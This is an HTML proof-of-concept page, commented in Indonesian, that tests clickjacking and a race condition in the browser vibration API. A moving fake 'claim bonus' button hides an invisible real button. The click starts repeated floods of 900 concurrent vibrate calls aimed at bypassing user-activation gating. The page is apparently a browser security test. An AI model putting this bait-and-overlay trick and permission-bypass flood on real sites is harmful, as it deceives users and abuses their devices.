<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Test: Moving Clickjacking & Race Condition</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background-color: #121214;
            color: #e3e3e3;
            text-align: center;
            padding: 20px;
            overflow-x: hidden;
        }
        .container {
            max-width: 450px;
            margin: 30px auto;
            background: #1e1e24;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            position: relative;
        }
        button {
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin-bottom: 10px;
            border: none;
            transition: 0.2s;
        }
        .btn-stop { background-color: #dc3545; color: white; }
        .btn-stop:hover { background-color: #bd2130; }
        
        #status-log {
            margin-top: 20px;
            padding: 15px;
            background: #000;
            color: #00ff66;
            font-family: monospace;
            text-align: left;
            border-radius: 6px;
            font-size: 12px;
            min-height: 150px;
            max-height: 300px;
            overflow-y: auto;
            white-space: pre-wrap;
        }

        /* ======================================================== */
        /* STRATEGI CLICKJACKING DENGAN ELEMEN BERGERAK             */
        /* ======================================================== */
        
        /* Area panggung tempat tombol bergerak */
        .stage-area {
            width: 100%;
            height: 120px;
            margin: 20px 0;
            position: relative;
            background: #151518;
            border: 2px dashed #333;
            border-radius: 12px;
            overflow: hidden;
        }

        /* Wadah utama yang bergerak. Berisi tombol palsu & tombol asli transparan */
        .bait-box {
            position: absolute;
            width: 220px;
            height: 50px;
            top: 35px; /* Posisikan di tengah vertikal panggung */
            left: 0;
            border-radius: 30px;
            /* Menjalankan animasi bergerak ke kiri-kanan secara horizontal */
            animation: gerakHorizontal 3s ease-in-out infinite alternate;
        }
        
        /* Umpan visual bergerak yang memancing mata pengguna */
        .fake-target-btn {
            background: #ffc107; /* Warna kuning agar kontras */
            color: #000;
            padding: 13px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 30px;
            width: 100%;
            height: 100%;
            text-align: center;
            box-shadow: 0 4px 15px rgba(255,193,7,0.4);
            letter-spacing: 1px;
        }

        /* Tombol start asli yang menempel MATI pada wadah bergerak */
        #startBtn {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            opacity: 0; /* 100% Tidak terlihat */
            z-index: 999; /* Lapisan paling atas memotong semua ketukan jari */
            cursor: pointer;
            border: none;
            border-radius: 30px;
        }

        /* Animasi CSS untuk menggerakkan tombol ke kanan dan ke kiri */
        @keyframes gerakHorizontal {
            0% {
                transform: translateX(10px);
            }
            100% {
                /* Bergerak maksimal ke ujung kanan wadah kontainer */
                transform: translateX(calc(100% - 40px));
            }
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Moving Clickjacking Race</h2>
    <p style="color: #aaa; font-size: 14px; margin-top: 5px;">
        Ketuk tombol kuning yang bergerak untuk mensimulasikan kegagalan refleks pengguna.
    </p>
    
    <!-- Panggung Gerak Terisolasi -->
    <div class="stage-area">
        <div class="bait-box">
            <div class="fake-target-btn">🎁 KLAIM BONUS 🎁</div>
            <!-- Tombol Asli ikut bergerak secara pasif karena berada dalam satu container -->
            <button id="startBtn"></button>
        </div>
    </div>

    <button id="stopBtn" class="btn-stop">HENTIKAN PENGUJIAN</button>

    <h3>Konsol Log Logika:</h3>
    <div id="status-log">Menunggu inisialisasi klik...</div>
</div>

<script>
    const logBox = document.getElementById('status-log');
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');

    let isRunning = false;
    let loopCounter = 0;

    function writeLog(text) {
        logBox.innerHTML += "\n> " + text;
        logBox.scrollTop = logBox.scrollHeight;
        console.log(text);
    }

    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    // Logika Race Condition (900 iterasi asinkron)
    async function triggerRaceCondition() {
        let promises = [];
        for (let i = 0; i < 900; i++) {
            promises.push((async () => {
                await sleep(Math.random() * 100); 
                if (navigator.vibrate) {
                    return navigator.vibrate(999999999999999999);
                }
                return false;
            })());
        }
        const results = await Promise.all(promises);
        return results.includes(true);
    }

    // Fungsi Pengulangan Utama
    async function startTestingLoop() {
        isRunning = true;
        loopCounter = 0;
        logBox.innerHTML = "";
        writeLog("💥 Clickjacking Sukses: Tombol bergerak berhasil dijebak!");
        writeLog("Memulai Loop Penundaan & Paket Race...");

        while (isRunning) {
            loopCounter++;
            writeLog(`[Siklus #${loopCounter}] Memulai delay asinkron 6 detik...`);
            
            await sleep(6000);

            if (!isRunning) break;

            if (navigator.userActivation) {
                writeLog(`Siklus #${loopCounter} - Status Aktivasi Resmi (isActive): ` + navigator.userActivation.isActive);
            }

            writeLog(`Siklus #${loopCounter} - Meluncurkan 900 Paket Race...`);
            let isBypassed = await triggerRaceCondition();

            if (isBypassed) {
                writeLog(`🚨 BUG CONFIRMED: Getar lolos otomatis di Siklus #${loopCounter}!`);
            } else {
                writeLog(`❌ Siklus #${loopCounter}: Diblokir sistem inti browser.`);
            }

            await sleep(1000);
        }
    }

    // Pemicu Klik Tersembunyi pada Elemen Bergerak
    startBtn.addEventListener('click', () => {
        if (!isRunning) {
            startBtn.style.pointerEvents = 'none'; // Amankan dari double click berlebih
            startTestingLoop();
        }
    });

    // Pemicu Stop Bersih
    stopBtn.addEventListener('click', () => {
        isRunning = false;
        if (navigator.vibrate) {
            navigator.vibrate(0); // Batalkan semua perintah haptik aktif
        }
        writeLog("🛑 Pengujian dihentikan. Memori dibersihkan.");
        startBtn.style.pointerEvents = 'auto'; // Aktifkan kembali akses klik
    });
</script>

</body>
</html>
